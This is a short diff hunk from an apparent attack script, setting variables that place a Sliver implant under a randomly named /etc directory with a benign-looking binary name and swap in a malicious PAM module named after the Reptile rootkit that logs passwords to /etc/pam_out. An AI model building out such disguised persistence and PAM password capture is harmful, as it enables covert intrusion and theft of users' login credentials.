@@ -21,7 +21,7 @@ RANDOM_BINARY_NAME="authenticate"
 
 
 SLIVER_PAYLOAD_PATH="/etc/$RANDOM_ETC_DIR/$RANDOM_BINARY_NAME"
-PAM_SO_PATH="/etc/pam.d/pam_login.so"
+PAM_SO_PATH="/etc/pam.d/reptile_pam.so"
 PAM_PASSWORD_STORE="/etc/pam_out"
 
 
